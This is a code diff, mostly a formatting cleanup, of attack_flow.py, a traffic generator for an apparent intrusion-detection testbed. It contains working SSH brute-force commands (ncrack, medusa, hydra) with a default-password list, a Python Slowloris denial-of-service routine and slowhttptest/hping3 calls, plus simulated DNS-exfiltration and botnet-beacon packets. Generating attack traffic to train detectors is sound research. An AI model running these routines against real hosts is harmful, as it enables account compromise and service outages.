@@ -1,34 +1,33 @@
-"""
-attack_flow.py — Offensive traffic simulation utility for FL-CL testbed.
+# attack_flow.py — Offensive traffic simulation utility for FL-CL testbed.
+#
+# Supports modular multi-engine execution:
+# - 'kali': Prefers native Kali Linux penetration testing binaries (ncrack, hydra, slowhttptest, hping3, scapy).
+# - 'python': Pure Python standard library & PyPI dependencies (zero external binary dependency).
+# - 'auto': Discovers available Kali tools on PATH/venv, falling back seamlessly to Python implementations.
+#
+# Runs on: Traffic Generator VM (VM 400)
 
-Supports modular multi-engine execution:
-  - 'kali': Prefers native Kali Linux penetration testing binaries (ncrack, hydra, slowhttptest, hping3, scapy).
-  - 'python': Pure Python standard library & PyPI dependencies (zero external binary dependency).
-  - 'auto': Discovers available Kali tools on PATH/venv, falling back seamlessly to Python implementations.
-
-Runs on: Traffic Generator VM (VM 400)
-"""
 import argparse
 import os
 import random
 import shutil
 import socket
-import ssl
 import subprocess
-import sys
-import threading
 import time
 import urllib.request
 
 try:
     from logger import get_logger
+
     _log = get_logger("attack_flow")
 except ImportError:
     try:
         from src.logger import get_logger
+
         _log = get_logger("attack_flow")
     except ImportError:
         import logging
+
         _log = logging.getLogger("attack_flow")
 
 
@@ -54,7 +53,9 @@ def run_process_for_duration(cmd: list, duration: int, label: str):
     _log.info(f"[*] [{label}] Executing: {' '.join(cmd)} (duration: {duration}s)")
     start_time = time.time()
     try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
         while time.time() - start_time < duration:
             if proc.poll() is not None:
                 # If command exited early (e.g., single scan finished), restart or sleep
@@ -69,10 +70,13 @@ def run_process_for_duration(cmd: list, duration: int, label: str):
                 proc.wait()
     except Exception as e:
         _log.error(f"[!] [{label}] Subprocess execution error: {e}")
-    _log.info(f"[*] [{label}] Completed/Terminated after {int(time.time() - start_time)}s.")
+    _log.info(
+        f"[*] [{label}] Completed/Terminated after {int(time.time() - start_time)}s."
+    )
 
 
 # ─── Benign Traffic ─────────────────────────────────────────────────────────
+
 
 def run_benign(target: str, duration: int):
     """Generates standard HTTP web traffic against target port 80."""
@@ -92,12 +96,24 @@ def run_benign(target: str, duration: int):
 
 # ─── SSH Brute Force (Class 3) ──────────────────────────────────────────────
 
+
 def _run_ssh_brute_python(target: str, duration: int):
     """Pure Python SSH connection & brute-force simulation using sockets."""
-    _log.info(f"[*] [Engine: Python] Starting SSH Brute Force simulation to {target}:22 for {duration}s...")
+    _log.info(
+        f"[*] [Engine: Python] Starting SSH Brute Force simulation to {target}:22 for {duration}s..."
+    )
     start_time = time.time()
     attempts = 0
-    passwords = ["admin", "123456", "password", "root", "toor", "guest", "test", "ubuntu"]
+    passwords = [
+        "admin",
+        "123456",
+        "password",
+        "root",
+        "toor",
+        "guest",
+        "test",
+        "ubuntu",
+    ]
     while time.time() - start_time < duration:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -116,7 +132,9 @@ def _run_ssh_brute_python(target: str, duration: int):
         except Exception:
             pass
         time.sleep(0.1)
-    _log.info(f"[*] [Engine: Python] SSH Brute Force completed. {attempts} attempts sent.")
+    _log.info(
+        f"[*] [Engine: Python] SSH Brute Force completed. {attempts} attempts sent."
+    )
 
 
 def run_ssh_brute(target: str, duration: int, engine: str = "auto"):
@@ -135,28 +153,70 @@ def run_ssh_brute(target: str, duration: int, engine: str = "auto"):
 
     if engine in ("kali", "auto"):
         if ncrack_bin:
-            cmd = [ncrack_bin, "-p", "22", "--user", "admin", "-P", wordlist, target, "-T", "5"] if os.path.exists(wordlist) else [ncrack_bin, "-p", "22", target]
+            cmd = (
+                [
+                    ncrack_bin,
+                    "-p",
+                    "22",
+                    "--user",
+                    "admin",
+                    "-P",
+                    wordlist,
+                    target,
+                    "-T",
+                    "5",
+                ]
+                if os.path.exists(wordlist)
+                else [ncrack_bin, "-p", "22", target]
+            )
             run_process_for_duration(cmd, duration, "Kali: ncrack")
             return
         elif medusa_bin and os.path.exists(wordlist):
-            cmd = [medusa_bin, "-h", target, "-u", "admin", "-P", wordlist, "-M", "ssh", "-t", "4"]
+            cmd = [
+                medusa_bin,
+                "-h",
+                target,
+                "-u",
+                "admin",
+                "-P",
+                wordlist,
+                "-M",
+                "ssh",
+                "-t",
+                "4",
+            ]
             run_process_for_duration(cmd, duration, "Kali: medusa")
             return
         elif hydra_bin and os.path.exists(wordlist):
-            cmd = [hydra_bin, "-I", "-l", "admin", "-P", wordlist, f"ssh://{target}", "-t", "4"]
+            cmd = [
+                hydra_bin,
+                "-I",
+                "-l",
+                "admin",
+                "-P",
+                wordlist,
+                f"ssh://{target}",
+                "-t",
+                "4",
+            ]
             run_process_for_duration(cmd, duration, "Kali: hydra")
             return
         elif engine == "kali":
-            _log.error("[!] Kali engine requested but no native SSH brute tool found. Falling back to Python.")
+            _log.error(
+                "[!] Kali engine requested but no native SSH brute tool found. Falling back to Python."
+            )
 
     _run_ssh_brute_python(target, duration)
 
 
 # ─── Slowloris DoS (Class 4) ────────────────────────────────────────────────
 
+
 def _run_slowloris_python(target: str, duration: int, port: int = 80):
     """Pure Python Slowloris implementation holding partial HTTP headers."""
-    _log.info(f"[*] [Engine: Python] Starting Slowloris DoS to {target}:{port} for {duration}s...")
+    _log.info(
+        f"[*] [Engine: Python] Starting Slowloris DoS to {target}:{port} for {duration}s..."
+    )
     sockets_list = []
     socket_count = 50
     start_time = time.time()
@@ -168,7 +228,11 @@ def _run_slowloris_python(target: str, duration: int, port: int = 80):
             s.connect((target, port))
             s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
             s.send(f"Host: {target}\r\n".encode("utf-8"))
-            s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
+            s.send(
+                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode(
+                    "utf-8"
+                )
+            )
             s.send(b"Accept-language: en-US,en,q=0.5\r\n")
             return s
         except Exception:
@@ -211,7 +275,7 @@ def _run_slowloris_python(target: str, duration: int, port: int = 80):
             s.close()
         except Exception:
             pass
-    _log.info(f"[*] [Engine: Python] Slowloris DoS completed.")
+    _log.info("[*] [Engine: Python] Slowloris DoS completed.")
 
 
 def run_slowloris(target: str, duration: int, port: int = 80, engine: str = "auto"):
@@ -227,9 +291,27 @@ def run_slowloris(target: str, duration: int, port: int = 80, engine: str = "aut
     if engine in ("kali", "auto"):
         if slowhttptest_bin:
             cmd = [
-                slowhttptest_bin, "-c", "100", "-H", "-g", "-o", "/tmp/slowhttptest",
-                "-i", "10", "-r", "200", "-t", "GET", "-u", f"http://{target}:{port}/",
-                "-x", "24", "-p", "3", "-l", str(duration)
+                slowhttptest_bin,
+                "-c",
+                "100",
+                "-H",
+                "-g",
+                "-o",
+                "/tmp/slowhttptest",
+                "-i",
+                "10",
+                "-r",
+                "200",
+                "-t",
+                "GET",
+                "-u",
+                f"http://{target}:{port}/",
+                "-x",
+                "24",
+                "-p",
+                "3",
+                "-l",
+                str(duration),
             ]
             run_process_for_duration(cmd, duration, "Kali: slowhttptest")
             return
@@ -242,16 +324,21 @@ def run_slowloris(target: str, duration: int, port: int = 80, engine: str = "aut
             run_process_for_duration(cmd, duration, "Kali: hping3")
             return
         elif engine == "kali":
-            _log.error("[!] Kali engine requested but no native DoS tool found. Falling back to Python.")
+            _log.error(
+                "[!] Kali engine requested but no native DoS tool found. Falling back to Python."
+            )
 
     _run_slowloris_python(target, duration, port)
 
 
 # ─── DNS Exfiltration (Class 2) ─────────────────────────────────────────────
 
+
 def _run_dns_exfil_python(target: str, duration: int):
     """Pure Python DNS exfiltration via raw UDP packets with structured queries."""
-    _log.info(f"[*] [Engine: Python] Starting DNS Exfiltration simulation to {target}:53 for {duration}s...")
+    _log.info(
+        f"[*] [Engine: Python] Starting DNS Exfiltration simulation to {target}:53 for {duration}s..."
+    )
     start_time = time.time()
     packets = 0
     while time.time() - start_time < duration:
@@ -271,7 +358,9 @@ def _run_dns_exfil_python(target: str, duration: int):
         except Exception:
             pass
         time.sleep(0.05)
-    _log.info(f"[*] [Engine: Python] DNS Exfiltration completed. {packets} packets sent.")
+    _log.info(
+        f"[*] [Engine: Python] DNS Exfiltration completed. {packets} packets sent."
+    )
 
 
 def run_dns_exfil(target: str, duration: int, engine: str = "auto"):
@@ -282,30 +371,44 @@ def run_dns_exfil(target: str, duration: int, engine: str = "auto"):
     """
     if engine in ("kali", "auto"):
         try:
-            from scapy.all import IP, UDP, DNS, DNSQR, send
-            _log.info(f"[*] [Engine: Kali/Scapy] Starting DNS Exfiltration to {target}:53 for {duration}s...")
+            from scapy.all import DNS, DNSQR, IP, UDP, send
+
+            _log.info(
+                f"[*] [Engine: Kali/Scapy] Starting DNS Exfiltration to {target}:53 for {duration}s..."
+            )
             start_time = time.time()
             packets = 0
             while time.time() - start_time < duration:
                 qname = f"exfil-{random.randint(100000, 999999)}.{random.choice(['data', 'tunnel', 'secret'])}.corp.internal"
-                pkt = IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
+                pkt = (
+                    IP(dst=target)
+                    / UDP(dport=53)
+                    / DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
+                )
                 send(pkt, verbose=False)
                 packets += 1
                 time.sleep(0.05)
-            _log.info(f"[*] [Engine: Kali/Scapy] DNS Exfiltration completed. {packets} packets sent.")
+            _log.info(
+                f"[*] [Engine: Kali/Scapy] DNS Exfiltration completed. {packets} packets sent."
+            )
             return
         except ImportError:
             if engine == "kali":
-                _log.error("[!] Scapy not installed. Falling back to native Python DNS generator.")
+                _log.error(
+                    "[!] Scapy not installed. Falling back to native Python DNS generator."
+                )
 
     _run_dns_exfil_python(target, duration)
 
 
 # ─── Botnet C2 Beaconing (Class 1) ──────────────────────────────────────────
 
+
 def _run_botnet_python(target: str, duration: int):
     """Pure Python multi-round TCP session C2 beaconing across ports 8080/8888/9000."""
-    _log.info(f"[*] [Engine: Python] Starting Botnet C2 beaconing to {target} for {duration}s...")
+    _log.info(
+        f"[*] [Engine: Python] Starting Botnet C2 beaconing to {target} for {duration}s..."
+    )
     c2_ports = [8080, 8888, 9000]
     start_time = time.time()
     beacons = 0
@@ -344,7 +447,9 @@ def _run_botnet_python(target: str, duration: int):
         if time.time() - start_time < duration:
             time.sleep(min(0.2, max(0.05, duration - (time.time() - start_time))))
 
-    _log.info(f"[*] [Engine: Python] Botnet C2 beaconing completed. {beacons} sessions sent.")
+    _log.info(
+        f"[*] [Engine: Python] Botnet C2 beaconing completed. {beacons} sessions sent."
+    )
 
 
 def run_botnet_beacon(target: str, duration: int, engine: str = "auto"):
@@ -356,7 +461,10 @@ def run_botnet_beacon(target: str, duration: int, engine: str = "auto"):
     if engine in ("kali", "auto"):
         try:
             from scapy.all import IP, TCP, Raw, send
-            _log.info(f"[*] [Engine: Kali/Scapy] Starting Botnet C2 beaconing to {target} for {duration}s...")
+
+            _log.info(
+                f"[*] [Engine: Kali/Scapy] Starting Botnet C2 beaconing to {target} for {duration}s..."
+            )
             start_time = time.time()
             c2_ports = [8080, 8888, 9000]
             beacons = 0
@@ -364,33 +472,54 @@ def run_botnet_beacon(target: str, duration: int, engine: str = "auto"):
                 port = random.choice(c2_ports)
                 sport = random.randint(40000, 60000)
                 payload = f"POST /stager HTTP/1.1\r\nHost: c2\r\n\r\n{'A'*64}"
-                pkt = IP(dst=target)/TCP(sport=sport, dport=port, flags="PA")/Raw(load=payload)
+                pkt = (
+                    IP(dst=target)
+                    / TCP(sport=sport, dport=port, flags="PA")
+                    / Raw(load=payload)
+                )
                 send(pkt, verbose=False)
                 beacons += 1
                 time.sleep(random.uniform(0.3, 1.2))
-            _log.info(f"[*] [Engine: Kali/Scapy] Botnet C2 beaconing completed. {beacons} packets sent.")
+            _log.info(
+                f"[*] [Engine: Kali/Scapy] Botnet C2 beaconing completed. {beacons} packets sent."
+            )
             return
         except ImportError:
             if engine == "kali":
-                _log.error("[!] Scapy not installed. Falling back to native Python C2 generator.")
+                _log.error(
+                    "[!] Scapy not installed. Falling back to native Python C2 generator."
+                )
 
     _run_botnet_python(target, duration)
 
 
 # ─── Main Entrypoint ────────────────────────────────────────────────────────
 
+
 def main():
     parser = argparse.ArgumentParser(description="FL-CL Modular Attack Flow Generator")
-    parser.add_argument("--mode", choices=["ssh", "slowloris", "benign", "dns_exfil", "botnet"], required=True,
-                        help="Attack or traffic scenario mode")
+    parser.add_argument(
+        "--mode",
+        choices=["ssh", "slowloris", "benign", "dns_exfil", "botnet"],
+        required=True,
+        help="Attack or traffic scenario mode",
+    )
     parser.add_argument("--target", required=True, help="Target IP address")
     parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
-    parser.add_argument("--port", type=int, default=80, help="Target port for Slowloris/web traffic")
-    parser.add_argument("--engine", choices=["auto", "kali", "python"], default="auto",
-                        help="Attack execution engine: 'kali' (security binaries), 'python' (pure stdlib/pip), 'auto' (detect and fallback)")
+    parser.add_argument(
+        "--port", type=int, default=80, help="Target port for Slowloris/web traffic"
+    )
+    parser.add_argument(
+        "--engine",
+        choices=["auto", "kali", "python"],
+        default="auto",
+        help="Attack execution engine: 'kali' (security binaries), 'python' (pure stdlib/pip), 'auto' (detect and fallback)",
+    )
     args = parser.parse_args()
 
-    _log.info(f"[*] FL-CL Traffic Generator | Mode: {args.mode} | Target: {args.target} | Duration: {args.duration}s | Engine: {args.engine}")
+    _log.info(
+        f"[*] FL-CL Traffic Generator | Mode: {args.mode} | Target: {args.target} | Duration: {args.duration}s | Engine: {args.engine}"
+    )
 
     if args.mode == "benign":
         run_benign(args.target, args.duration)
